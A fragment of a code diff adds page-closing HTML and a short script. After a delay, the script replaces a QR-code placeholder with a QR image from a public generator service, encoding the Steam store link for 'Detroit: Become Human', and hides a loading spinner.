+            const qrPlaceholder = document.querySelector('.qr-code-placeholder');
+            const qrSpinner = document.querySelector('.qr-loading-spinner');
+            
+            // Create real QR code image
+            const qrImg = document.createElement('img');
+            qrImg.src = 'https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=https://store.steampowered.com/app/1222140/Detroit_Become_Human/&bgcolor=1a1a1a&color=ffffff';
+            qrImg.alt = 'QR Code';
+            qrImg.className = 'qr-code-real';
+            
+            // Replace SVG with real QR
+            qrPlaceholder.innerHTML = '';
+            qrPlaceholder.appendChild(qrImg);
+            
+            // Remove blur and show
+            qrPlaceholder.classList.add('loaded');
+            qrSpinner.classList.add('hidden');
+        }, 1500);
+    </script>
+</body>
+</html>
